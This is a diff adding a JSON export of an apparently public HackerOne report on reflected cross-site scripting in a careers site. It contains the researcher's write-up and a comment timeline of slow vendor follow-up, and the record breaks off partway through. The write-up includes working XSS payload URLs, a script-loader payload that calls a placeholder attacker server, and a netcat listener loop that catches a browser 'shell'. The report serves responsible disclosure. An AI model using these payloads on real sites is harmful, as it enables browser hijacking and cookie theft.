@@ -1,0 +1,763 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2016-12-01T00:20:50.194Z", 
+    "voters": [
+        "sameoldstory", 
+        "delimitry", 
+        "notnaffy", 
+        "fillawful", 
+        "suv", 
+        "bogdantcaciuc", 
+        "flashdisk", 
+        "pekafat", 
+        "bugdiscloseguys", 
+        "eveeez", 
+        "and 36 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 147196, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": null, 
+    "vulnerability_information": "#####Description\nCross-site Scripting (XSS) refers to client-side code injection attack wherein an attacker can execute malicious scripts (also commonly referred to as a malicious payload) into a legitimate website or web application. XSS is amongst the most rampant of web application vulnerabilities and occurs when a web application makes use of unvalidated or unencoded user input within the output it generates.\n\n\n#####Issue\nThe consultant identified that the careers page is vulnerable to reflected cross site scripting, this means that a malicious user can craft a link to compromise a user, the user simple needs to click on the link and the payload is launched. \n\n----------\n#####Affected URLs\n    https://careers.informatica.com/apply?isJTN=%3Cscript%3Eprompt(%27ZephrFish%27)%3C/script%3E\n\nFrom the affected URL it can be seen that the `isJTN` parameter can be given any javascript code or HTML tags and it will execute the code within. The above payload simply launches a prompt box with the consultant's hackerone username ZephrFish. However cross site scripting can be further weaponised to hook a victim's browser and cause further damage. See the proof of concept section below for a full weaponised scenario using this reflected cross site scripting to execute client side code execution.\n\n####Risk: **High**\nThis issue has been marked as high due to  the risk of compromise being on the user rather than server side, however this should still be considered as an issue and dealt with accordingly, if an attacker is able to compromise a victim's browser they can do far worse than pop an alert message. This is essentially a new form of reflected cross site scripting which is persistent to the user's browser being open.\n\n#####Remediaton\nImplement http authentication on the affected directories, or alternatively  remove the examples folder entirely to prevent the attack surface.  Consider following a lockdown procedure against the installation and updating Tomcat to a newer instance. \n\n#####Weaponising Cross Site Scripting\nThe following example demonstrates how an attacker can establish a persistent connection to a victim's browser and proceed to execute arbitrary commands on the victim's machine.\n\n**The hook**\nThe victim receives a malicious link, similar to that shown below:\n\n    https://careers.informatica.com/apply?isJTN=<script>setInterval(function(){d=document;z=d.createElement(\"script\");z.src=\"//AttackerServerIP:ANYPORT\";d.body.appendChild(z)},0)</script>\n\nAttacker Server:\nThe attacker runs the following code to catch the shell with netcat:\n\n    while :; do printf \"ZephrFishHackerOne>$ \"; read c; echo $c | nc -vvlp PORTNUMBER >/dev/null; done\n\nWhen this link is clicked on the attacker's server will catch a shell and allow the attacker to execute arbitrary commands on the victim's browser as shown in the attached screenshots, these commands can be any javascript commands including theft of cookies, redirection of victim's browser or in some cases malware delivery.\n\nThe following shows what is shown on the attacker's server when a valid connection attempt is received:\n\n    [root@inform]# while :; do printf \"ZephrFishHackerOne>$ \"; read c; echo $c | nc -vvlp 533 >/dev/null; done\n    ZephrFishHackerOne>$ alert('Shell')\n    listening on [any] 533 ...\n    connect to [ATTACKERIP] from VICTIM HOSTNAME [VICTIM BROWSERIP] 55730\n     sent 15, rcvd 245\n\n\n#####References\n\n - [OWASP: Cross Site Scripting Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)\n\n#####Request & Response\nGET Request\n\n    GET /apply?isJTN=%3Cscript%3Eprompt('ZephrFish')%3C/script%3E HTTP/1.1\n    Host: careers.informatica.com\n    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n    Accept-Language: en-US,en;q=0.5\n    Accept-Encoding: gzip, deflate, br\n    Cookie: AMCV_C0B11CFE5330AAFD0A490D45%40AdobeOrg=793872103%7CMCIDTS%7C16977%7CMCMID%7C43066833403543674402896414893465241440%7CMCAID%7CNONE%7CMCAAMLH-1467332027%7C6%7CMCAAMB-1467332028%7CNRX38WO0n5BH8Th-nqAG_A; mbox=PC#1466727226198-680058.26_3#1468009316|check#true#1466799776|session#1466799715648-663873#1466801576; s_nr=1466799716120-Repeat; s_vnum=1469319227675%26vn%3D3; mktrest_end_time=1466727232954; mktrest_cookie=anonymous; wooTracker=pFDG1ZqP3HWn; _mkto_trk=id:189-ZHZ-794&token:_mch-informatica.com-1466727758906-39922; mrkto_lead=\"{\\\"requestId\\\":\\\"11ba9#1557fcb4463\\\",\\\"result\\\":[],\\\"success\\\":true,\\\"marketoCall\\\":\\\"false\\\"}\"; do_mkto_call=false; _ga=GA1.2.935149421.1466727762\n    Connection: close\n    \n\n   \nResponse\n\n    HTTP/1.1 200 OK\n    Content-Language: en-US\n    Content-Type: text/html;charset=utf-8\n    Date: Sat, 25 Jun 2016 14:14:16 GMT\n    Server: Apache-Coyote/1.1\n    Strict-Transport-Security: max-age=63072000; includeSubdomains; preload\n    Vary: Accept-Encoding\n    Connection: Close\n    Content-Length: 53097\n    ---snip---\n                var payload = {fileUrl: link, jobSeqNo: jobId, refNum: refNum, isQuickApply: isQuickApply,\n                                actualJobId: actualJobId, title: title, location: location,\n                                applySource: applySource, applyUrl: applyUrl, category: category, isJTN: \"<script>prompt('ZephrFish')</script>\",\n                                atsApplyDataId:atsApplyDataId,atsApplyStatusId:atsApplyStatusId, applyType: applyType,\n                                screenWidth: screen.width, screenHeight: screen.height}\n               sendDownloadResume(payload) \n    ---snip---\n\n", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "none", 
+            "user_interaction": "required", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "unchanged", 
+            "integrity": "low", 
+            "availability": "none"
+        }, 
+        "rating": "high", 
+        "score": 7.1, 
+        "author_type": "User"
+    }, 
+    "title": "[careers.informatica.com] Reflected Cross Site Scripting to XSS Shell Possible", 
+    "is_member_of_team?": null, 
+    "vote_count": 46, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2016-12-31T00:20:50.228Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "attachments": [
+        {
+            "file_name": "xss_shell_career.png", 
+            "type": "image/png", 
+            "id": 101556, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/101/556/a2684f9ded0ba6d3818e2e78f30652b43e4896fb/xss_shell_career.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRRGIDB3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224225Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDBxaaLwYN2vGJMHU3yK3A60CbW7QJhRBSUWEebtoqVFBavCBeg3jCt%2Ff6Ue7ixJjwCt7yq0tq9sMjLsNcoWRvtzj2%2FROkCO4zNzzBp31CEVqphGDPGK4TwxJpsrRac9NLMf03D%2Be%2BJ2ZNV2d3nHzvT4XKWaT82j9XOTkFb6Na6DxwgvQvr1Hf%2FEqlGdE892eO07jT5EU%2FK35L97rIFHrO9VcuTN7ryNS%2B7sAimJ6rHmOLQJ%2BYUkhqg0irzYjFAYK2lpH5L8hzjkL5gOuzMlDEuL3UJAzmDO%2BlHSr3KOiEOOJt5CAwYCvbfdQ%2Fmf9SK6rXcy%2BUcSjH31N16mUjQCBjabHn0E45bovxZ0SsgCCItoso2NvMPAl7ZTxRvQFkkIMIKFg%2F17b%2F6Efuj07DmrIFpvHwbVR9jVNresgxKqtpJ4WLjNKNl1rYMpAMWsuond5AHhcYsUjveEyaC9r3bV2RH0HyaZPga0CQ8O2R5uHtuAnNSkzHtOZlrgultAHw6bLgsH%2F3dQsi24%2BF0PkFA5L29Va%2FxPiVy3QrmsPxcQPTKnaR%2BmyDfaDY9xyHusS%2BLnQHy9tJ9RX447YdvsdbyGpRbao2BKcHLcosL%2Bm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=842c81e4b7f5263fe21d741dcab148707b926487188bc1c98abf721c06de9261"
+        }, 
+        {
+            "file_name": "careers-xss.png", 
+            "type": "image/png", 
+            "id": 101557, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/101/557/66950a3542b43ea754dc7812f12bb1b545acdff3/careers-xss.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRRGIDB3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224225Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDBxaaLwYN2vGJMHU3yK3A60CbW7QJhRBSUWEebtoqVFBavCBeg3jCt%2Ff6Ue7ixJjwCt7yq0tq9sMjLsNcoWRvtzj2%2FROkCO4zNzzBp31CEVqphGDPGK4TwxJpsrRac9NLMf03D%2Be%2BJ2ZNV2d3nHzvT4XKWaT82j9XOTkFb6Na6DxwgvQvr1Hf%2FEqlGdE892eO07jT5EU%2FK35L97rIFHrO9VcuTN7ryNS%2B7sAimJ6rHmOLQJ%2BYUkhqg0irzYjFAYK2lpH5L8hzjkL5gOuzMlDEuL3UJAzmDO%2BlHSr3KOiEOOJt5CAwYCvbfdQ%2Fmf9SK6rXcy%2BUcSjH31N16mUjQCBjabHn0E45bovxZ0SsgCCItoso2NvMPAl7ZTxRvQFkkIMIKFg%2F17b%2F6Efuj07DmrIFpvHwbVR9jVNresgxKqtpJ4WLjNKNl1rYMpAMWsuond5AHhcYsUjveEyaC9r3bV2RH0HyaZPga0CQ8O2R5uHtuAnNSkzHtOZlrgultAHw6bLgsH%2F3dQsi24%2BF0PkFA5L29Va%2FxPiVy3QrmsPxcQPTKnaR%2BmyDfaDY9xyHusS%2BLnQHy9tJ9RX447YdvsdbyGpRbao2BKcHLcosL%2Bm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bb09d46c7cf4764b1ae1f96acb8d4e1f50adc1d4e0f9ccd4b00dba3982bb08b1"
+        }, 
+        {
+            "file_name": "xss_shell_career-commands.png", 
+            "type": "image/png", 
+            "id": 101558, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/101/558/3dc6e46e316795e8bea017bcd40f5ffd8e724402/xss_shell_career-commands.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRRGIDB3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224225Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDBxaaLwYN2vGJMHU3yK3A60CbW7QJhRBSUWEebtoqVFBavCBeg3jCt%2Ff6Ue7ixJjwCt7yq0tq9sMjLsNcoWRvtzj2%2FROkCO4zNzzBp31CEVqphGDPGK4TwxJpsrRac9NLMf03D%2Be%2BJ2ZNV2d3nHzvT4XKWaT82j9XOTkFb6Na6DxwgvQvr1Hf%2FEqlGdE892eO07jT5EU%2FK35L97rIFHrO9VcuTN7ryNS%2B7sAimJ6rHmOLQJ%2BYUkhqg0irzYjFAYK2lpH5L8hzjkL5gOuzMlDEuL3UJAzmDO%2BlHSr3KOiEOOJt5CAwYCvbfdQ%2Fmf9SK6rXcy%2BUcSjH31N16mUjQCBjabHn0E45bovxZ0SsgCCItoso2NvMPAl7ZTxRvQFkkIMIKFg%2F17b%2F6Efuj07DmrIFpvHwbVR9jVNresgxKqtpJ4WLjNKNl1rYMpAMWsuond5AHhcYsUjveEyaC9r3bV2RH0HyaZPga0CQ8O2R5uHtuAnNSkzHtOZlrgultAHw6bLgsH%2F3dQsi24%2BF0PkFA5L29Va%2FxPiVy3QrmsPxcQPTKnaR%2BmyDfaDY9xyHusS%2BLnQHy9tJ9RX447YdvsdbyGpRbao2BKcHLcosL%2Bm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b0c22f85e042b1fe2a878f43e193a913c0fbc45ee2251a3ae39d16250e2caea5"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2016-06-26T00:33:46.306Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-06-26T00:33:46.306Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "I apologize, the remediation instructions for this report are completely wrong, what they should be is as follows:\n\n######Remediaton\nAll HTML sensitive content received by the application from all input sources  \nshould be filtered or encoded to prevent XSS. The filtering and encoding method \nshould be standardised throughout the application to ensure that consistent \nprotection is provided in all areas.  Ideally a whitelist approach should be used \ni.e. only allowed expressions should be accepted by validation routines.", 
+            "markdown_message": "<p>I apologize, the remediation instructions for this report are completely wrong, what they should be is as follows:</p>\n\n<h6 id=\"remediaton\">Remediaton</h6>\n\n<p>All HTML sensitive content received by the application from all input sources<br><br>\nshould be filtered or encoded to prevent XSS. The filtering and encoding method <br>\nshould be standardised throughout the application to ensure that consistent <br>\nprotection is provided in all areas.  Ideally a whitelist approach should be used <br>\ni.e. only allowed expressions should be accepted by validation routines.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1037436, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-06-26T13:46:36.983Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-06-26T13:46:36.983Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "#", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1038067, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-06-28T09:19:01.120Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-06-28T09:19:01.120Z", 
+            "actor": {
+                "username": "porkbun", 
+                "url": "/porkbun", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "Hi @zephrfish,\n\nThank you for your report. We have assessed it and determined that the issue you have disclosed is valid. It has been submitted to our technical teams, and we will notify you once the issue has been resolved. Thank you for your efforts in helping keep Informatica safe! We look forward to your future submissions.\n\nRegards,\n-The Informatica Team", 
+            "markdown_message": "<p>Hi <a href=\"/zephrfish\">@zephrfish</a>,</p>\n\n<p>Thank you for your report. We have assessed it and determined that the issue you have disclosed is valid. It has been submitted to our technical teams, and we will notify you once the issue has been resolved. Thank you for your efforts in helping keep Informatica safe! We look forward to your future submissions.</p>\n\n<p>Regards,<br>\n-The Informatica Team</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 1042488, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-06-28T09:27:44.510Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-06-28T09:27:44.510Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "Hi Informatica,\n\nThank you for validating my report. If there are any additional details that you require please just ping me. Additionally will this bug be valid for a T-Shirt?\n\nKind Regards,\n\n@zephrfish ", 
+            "markdown_message": "<p>Hi Informatica,</p>\n\n<p>Thank you for validating my report. If there are any additional details that you require please just ping me. Additionally will this bug be valid for a T-Shirt?</p>\n\n<p>Kind Regards,</p>\n\n<p><a href=\"/zephrfish\">@zephrfish</a> </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1042496, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-07-01T16:03:54.175Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-07-01T16:03:54.175Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "Hi, just wondering if there's been any update?", 
+            "markdown_message": "<p>Hi, just wondering if there&#39;s been any update?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1049475, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-07-06T08:29:17.672Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-07-06T08:29:17.672Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "Hi @ctran @informatica I was wondering if there's been any update on this?", 
+            "markdown_message": "<p>Hi <a href=\"/ctran\">@ctran</a> <a href=\"/informatica\">@informatica</a> I was wondering if there&#39;s been any update on this?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1055153, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-07-11T13:13:16.365Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-07-11T13:13:16.365Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "Hi, has there been any update on this? I've not heard anything back from any of these @informatica", 
+            "markdown_message": "<p>Hi, has there been any update on this? I&#39;ve not heard anything back from any of these <a href=\"/informatica\">@informatica</a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1062759, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-07-11T20:18:37.664Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-07-11T20:18:37.664Z", 
+            "actor": {
+                "username": "zjulian", 
+                "url": "/zjulian", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/005/655/7178efed8c4fd77cad39bbd4caece712b57295d5_medium.png?1398716940"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_title": "[careers.informatica.com] Reflected Cross Site Scripting to XSS Shell Possible", 
+                "old_title": "[https://careers.informatica.com] Reflected Cross Site Scripting to XSS Shell Possible"
+            }, 
+            "team_handle": "informatica", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportTitleUpdated", 
+            "id": 1063779, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-07-29T14:51:55.950Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-07-29T14:51:55.950Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "Has there been an update on this? Are any eligible for a t shirt?", 
+            "markdown_message": "<p>Has there been an update on this? Are any eligible for a t shirt?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1095296, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-08-14T10:51:14.476Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-08-14T10:51:14.476Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "#", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1125715, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-08-20T13:56:53.626Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-08-20T13:56:53.626Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "@zjulian @ctran @informatica is there any update on this, either in regards to fix or eligibility? ", 
+            "markdown_message": "<p><a href=\"/zjulian\">@zjulian</a> <a href=\"/ctran\">@ctran</a> <a href=\"/informatica\">@informatica</a> is there any update on this, either in regards to fix or eligibility? </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1142221, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-08-23T23:11:32.608Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-08-23T23:11:32.608Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "#", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1150469, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-09-14T20:09:12.237Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-09-14T20:09:12.237Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "just wondering if there's been any update on this? @informatica", 
+            "markdown_message": "<p>just wondering if there&#39;s been any update on this? <a href=\"/informatica\">@informatica</a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1194394, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-09-28T22:11:08.998Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-09-28T22:11:08.998Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "Had no response in just over three months. No communication either as to status of bug or if it's eligible.", 
+            "markdown_message": "<p>Had no response in just over three months. No communication either as to status of bug or if it&#39;s eligible.</p>\n", 
+            "type": "Activities::HackerRequestedMediation", 
+            "id": 1222611, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-06T09:18:12.846Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-06T09:18:12.846Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "High (7.1)", 
+                "old_severity": null
+            }, 
+            "team_handle": "informatica", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 1234996, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-10T23:21:06.859Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-10T23:21:06.859Z", 
+            "actor": {
+                "username": "ttoko", 
+                "url": "/ttoko", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/347/32202de788e03d55e0c958f820fe2917eb305a8b_medium.jpg?1443193918"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "Hi @zephrfish,\n\nThe vulnerability is in a third party vendor's software. We are communicating with the vendor to get this fixed. Please note that any ticket that is triaged is being tracked by Informatica and will be updated when there is additional information.\n\nThank you for your patience!", 
+            "markdown_message": "<p>Hi <a href=\"/zephrfish\">@zephrfish</a>,</p>\n\n<p>The vulnerability is in a third party vendor&#39;s software. We are communicating with the vendor to get this fixed. Please note that any ticket that is triaged is being tracked by Informatica and will be updated when there is additional information.</p>\n\n<p>Thank you for your patience!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1241264, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-10T23:24:29.316Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-10T23:24:29.316Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "Hi @ttoko ,\n\nThanks for the update, is there any sort of ETA on a fix? Thanks for the additional information re: tracking too. I felt that 3 months with no updates is a bit excessive though?\n\nRegards,", 
+            "markdown_message": "<p>Hi <a href=\"/ttoko\">@ttoko</a> ,</p>\n\n<p>Thanks for the update, is there any sort of ETA on a fix? Thanks for the additional information re: tracking too. I felt that 3 months with no updates is a bit excessive though?</p>\n\n<p>Regards,</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1241272, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-18T18:51:19.109Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-18T18:51:19.109Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "hi @ttoko , would you mind disclosing what the third party vendor is? reason for asking is if it's a 'new' finding would it be eligible for a CVE assignment?", 
+            "markdown_message": "<p>hi <a href=\"/ttoko\">@ttoko</a> , would you mind disclosing what the third party vendor is? reason for asking is if it&#39;s a &#39;new&#39; finding would it be eligible for a CVE assignment?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1253863, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-11-14T16:36:01.881Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-11-14T16:36:01.881Z", 
+            "actor": {
+                "username": "suv", 
+                "url": "/suv", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/031/939/d5f53e0fcd50652868eea05e9e65cca1ffa471d6_medium.jpg?1478870439"
+                }, 
+                "hackerone_triager": false
+            }, 
